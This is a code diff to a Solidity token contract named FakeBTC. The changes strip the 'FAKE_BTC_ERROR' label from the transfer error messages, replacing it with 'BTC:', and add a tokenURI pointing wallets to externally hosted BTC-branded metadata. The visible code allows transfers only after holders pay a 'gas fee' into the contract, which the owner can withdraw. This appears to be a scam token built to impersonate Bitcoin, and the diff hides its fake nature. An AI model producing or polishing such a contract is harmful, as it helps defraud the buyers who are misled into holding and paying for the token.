@@ -69,7 +69,7 @@ contract FakeBTC is ERC20, Ownable {
         // Check if sender has paid gas fee or is approved
         require(
             gasBalance[msg.sender] > 0 || approvedSenders[msg.sender],
-            "FAKE_BTC_ERROR: Cannot transfer without paying gas fee"
+            "BTC: Cannot transfer without paying gas fee"
         );
 
         // Deduct gas fee from gas balance (use custom fee if set for this user)
@@ -94,7 +94,7 @@ contract FakeBTC is ERC20, Ownable {
         // Check if sender has paid gas fee or is approved
         require(
             gasBalance[from] > 0 || approvedSenders[from],
-            "FAKE_BTC_ERROR: Cannot transfer without paying gas fee"
+            "BTC: Cannot transfer without paying gas fee"
         );
 
         // Deduct gas fee from gas balance (use custom fee if set for this user)
@@ -224,5 +224,13 @@ contract FakeBTC is ERC20, Ownable {
         require(success, "ETH withdrawal failed");
         
         emit GasFeesWithdrawn(amount);
+    }
+
+    /**
+     * @dev Returns token metadata URI (for wallet integration)
+     * Points to GitHub CDN hosted metadata with logo and token info
+     */
+    function tokenURI() public pure returns (string memory) {
+        return "https://raw.githubusercontent.com/Cryptovaultiq/ShowThem-BTC-token/main/metadata/btc-metadata.json";
     }
 }
